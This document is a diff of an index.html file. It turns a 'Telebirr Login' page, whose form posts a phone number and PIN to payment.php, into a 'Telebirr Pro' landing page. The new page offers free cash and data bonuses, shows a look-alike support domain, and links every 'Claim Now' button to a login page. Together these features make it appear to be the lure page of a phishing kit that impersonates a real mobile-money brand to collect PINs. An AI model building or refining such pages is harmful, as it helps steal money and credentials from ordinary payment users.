@@ -1,33 +1,178 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Telebirr Login</title>
-    <link rel="stylesheet" href="css/style.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telebirr Pro - Smart Mobile Payment</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <img src="images/logo.png" alt="Telebirr Logo" class="logo" />
-            <h1>Telebirr</h1>
-            <p class="subtitle">Secure &amp; Fast Mobile Payment</p>
-
-            <form id="loginForm" action="payment.php" method="POST">
-                <div class="input-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="tel" id="phone" name="phone" placeholder="09xxxxxxxx" required />
-                </div>
-                <div class="input-group">
-                    <label for="pin">PIN</label>
-                    <input type="password" id="pin" name="pin" placeholder="****" maxlength="6" required />
-                </div>
-                <button type="submit" class="btn-primary">Login</button>
-            </form>
-            <p class="footer-text">© 2026 Telebirr. All rights reserved.</p>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <img src="images/logo.png" alt="Telebirr" class="logo-small" onerror="this.style.display='none'">
+                <span>Telebirr Pro</span>
+            </div>
+            <div class="nav-links">
+                <a href="#features">Features</a>
+                <a href="#bonuses">Bonuses</a>
+                <a href="#about">About</a>
+                <a href="login.html" class="btn-login">Login</a>
+                <a href="login.html#register" class="btn-register">Register</a>
+            </div>
+            <div class="hamburger" onclick="toggleMenu()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
         </div>
-    </div>
-    <script src="js/script.js"></script>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="hero-content">
+            <h1>Smart Mobile <span>Payment</span></h1>
+            <p>Send money, pay bills, and claim bonuses instantly with Telebirr Pro</p>
+            <div class="hero-buttons">
+                <a href="login.html" class="btn-primary">Get Started</a>
+                <a href="#features" class="btn-secondary">Learn More</a>
+            </div>
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="stat-number" data-count="50000">0</span>
+                    <span class="stat-label">Active Users</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number" data-count="5000000">0</span>
+                    <span class="stat-label">Total Transactions (ETB)</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number" data-count="247">0</span>
+                    <span class="stat-label">24/7 Support</span>
+                </div>
+            </div>
+        </div>
+        <div class="hero-image">
+            <div class="phone-mockup">
+                <div class="phone-screen">
+                    <div class="phone-header">
+                        <span>Telebirr Pro</span>
+                        <span class="phone-balance">ETB 1,250.00</span>
+                    </div>
+                    <div class="phone-actions">
+                        <div class="phone-action">
+                            <i class="fas fa-paper-plane"></i>
+                            <span>Send</span>
+                        </div>
+                        <div class="phone-action">
+                            <i class="fas fa-gift"></i>
+                            <span>Bonus</span>
+                        </div>
+                        <div class="phone-action">
+                            <i class="fas fa-history"></i>
+                            <span>History</span>
+                        </div>
+                    </div>
+                    <div class="phone-bonus">
+                        <span>🎁 Daily Bonus Available</span>
+                        <span class="phone-bonus-amount">ETB 100</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section id="features" class="features">
+        <h2>Why Telebirr Pro?</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <i class="fas fa-mobile-alt"></i>
+                <h3>Easy Payments</h3>
+                <p>Send and receive money instantly with just a few taps</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-gift"></i>
+                <h3>Daily Bonuses</h3>
+                <p>Claim exciting rewards and bonuses every day</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-shield-alt"></i>
+                <h3>Secure</h3>
+                <p>Bank-grade security with PIN protection</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-bolt"></i>
+                <h3>Instant</h3>
+                <p>Money moves in seconds to any Telebirr user</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Bonuses Preview -->
+    <section id="bonuses" class="bonuses-section">
+        <h2>🎁 Active Bonuses</h2>
+        <div class="bonuses-grid">
+            <div class="bonus-card">
+                <div class="bonus-icon">📶</div>
+                <h3>Internet Package</h3>
+                <p class="bonus-amount">ETB 150</p>
+                <p class="bonus-desc">5GB Data + 1000 Minutes</p>
+                <a href="login.html" class="btn-claim">Claim Now</a>
+            </div>
+            <div class="bonus-card">
+                <div class="bonus-icon">💰</div>
+                <h3>Cash Bonus</h3>
+                <p class="bonus-amount">ETB 100</p>
+                <p class="bonus-desc">Free cash for new users</p>
+                <a href="login.html" class="btn-claim">Claim Now</a>
+            </div>
+            <div class="bonus-card">
+                <div class="bonus-icon">📱</div>
+                <h3>Data Bundle</h3>
+                <p class="bonus-amount">ETB 75</p>
+                <p class="bonus-desc">2GB Data + Social Media</p>
+                <a href="login.html" class="btn-claim">Claim Now</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>Telebirr Pro</h4>
+                <p>Smart mobile payment solutions</p>
+            </div>
+            <div class="footer-section">
+                <h4>Quick Links</h4>
+                <a href="#features">Features</a>
+                <a href="#bonuses">Bonuses</a>
+                <a href="#about">About</a>
+            </div>
+            <div class="footer-section">
+                <h4>Contact</h4>
+                <p>📞 09 123 4567</p>
+                <p>📧 support@telebirr.pro</p>
+            </div>
+            <div class="footer-section">
+                <h4>Follow Us</h4>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                    <a href="#"><i class="fab fa-facebook"></i></a>
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 Telebirr Pro. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="js/main.js"></script>
+    <script src="js/validation.js"></script>
 </body>
-  </html>
+                                              </html>
